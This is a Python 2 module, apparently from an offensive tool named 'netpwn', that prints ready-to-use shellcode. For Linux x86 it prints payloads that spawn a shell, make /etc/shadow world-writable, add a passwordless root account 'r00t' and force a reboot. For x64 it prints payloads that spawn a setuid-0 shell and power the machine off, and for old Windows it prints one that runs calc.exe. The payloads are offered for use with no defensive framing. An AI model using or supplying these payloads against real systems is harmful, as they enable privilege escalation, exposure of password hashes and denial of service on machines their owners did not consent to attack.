#!/usr/bin/python
"""shellcode module"""

from termcolor import colored


def generate_shellcode():
    """Generates shellcode of linux"""
    print colored('Enter target operating system', 'green')
    platform = raw_input(colored('(netwn: generate_shellcode) > ', 'red'))

    if platform == 'linux':
        print colored('Enter target architechure', 'green')
        arch = raw_input(colored('(netpwn: generate_shellcode) > ', 'red'))

        if arch == 'x86':
            print colored('Execute /bin/sh:', 'green')
            print colored(
                '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f'
                '\\x62\\x69\\x6e\\x89\\xe3\\x89'
                '\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80',
                'green')
            print ' '
            print colored('Chmod 777 /etc/shadow:', 'green')
            print colored(
                '\\x31\\xc0\\x50\\xb0\\x0f\\x68\\x61\\x64\\x6f\\x77'
                '\\x68\\x63\\x2f\\x73\\x68\\x68\\x2f'
                '\\x2f\\x65\\x74\\x89\\xe3\\x31\\xc9\\x66\\xb9\\xff\\x01\\xcd'
                '\\x80\\x40\\xcd\\x80',
                'green')
            print ' '
            print colored('Create root user r00t with no password:', 'green')
            print colored(
                '\\x6a\\x05\\x58\\x31\\xc9\\x51\\x68\\x73\\x73\\x77'
                '\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74'
                '\\x63\\x89\\xe3\\x66'
                '\\xb9\\x01\\x04\\xcd\\x80\\x89\\xc3\\x6a\\x04\\x58\\x31\\xd2'
                '\\x52\\x68\\x30\\x3a\\x3a\\x3a\\x68\\x3a\\x3a\\x30\\x3a\\x68'
                '\\x72\\x30\\x30\\x74\\x89\\xe1\\x6a\\x0c\\x5a\\xcd\\x80\\x6a'
                '\\x06\\x58\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80',
                'green')
            print ' '
            print colored('Forced reboot:', 'green')
            print colored(
                '\\x31\\xc0\\x50\\x68\\x62\\x6f\\x6f\\x74\\x68\\x6e'
                '\\x2f\\x72\\x65\\x68\\x2f\\x73\\x62'
                '\\x69\\x89\\xe3\\x50\\x66\\x68\\x2d\\x66\\x89\\xe6\\x50\\x56'
                '\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80',
                'green')

        elif arch == 'x64':
            print colored('Execute /bin/sh and setuid(0):', 'green')
            print colored(
                '\\x48\\x31\\xff\\xb0\\x69\\x0f\\x05\\x48\\x31\\xd2'
                '\\x48\\xbb\\xff\\x2f\\x62\\x69'
                '\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7'
                '\\x48\\x31\\xc0\\x50\\x57\\x48'
                '\\x89\\xe6\\xb0\\x3b\\x0f\\x05\\x6a\\x01\\x5f\\x6a\\x3c\\x58'
                '\\x0f\\x05',
                'green')
            print ' '
            print colored('Power off', 'green')
            print colored(
                '\\xba\\xdc\\xfe\\x21\\x43\\xbe\\x69\\x19\\x12'
                '\\x28\\xbf\\xad\\xde\\xe1\\xfe'
                '\\xb0\\xa9\\x0f\\x05',
                'green')

        else:
            print colored('Not a valid architecture', 'yellow')

    elif platform == 'mac':
        print colored('HAHA no', 'yellow')

    elif platform == 'windows':
        print colored('Lol windows... seriously...fine', 'yellow')
        print colored(
            'I would ask you for the architecture but I do not '
            'care very much so here try this it might'
            ' work on some windows xp version but i doubt it can be very '
            'useful unless you need to do some math...',
            'green')
        print colored(
            '\\xeb\\x1b\\x5b\\x31\\xc0\\x50\\x31\\xc0\\x88\\x43'
            '\\x13\\x53\\xbb\\xad\\x23\\x86\\x7c'
            '\\xff\\xd3\\x31\\xc0\\x50\\xbb\\xfa\\xca\\x81\\x7c\\xff\\xd3'
            '\\xe8\\xe0\\xff\\xff\\xff'
            '\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x63\\x20\\x63'
            '\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65',
            'green')
        print ' '
        print colored(
            'Instead of trying to run your shellcode on a windows '
            'box perhaps leave a note for the admin telling'
            ' them about this cool thing called linux',
            'green')

    else:
        print colored('Not a valid option try typing linux', 'yellow')
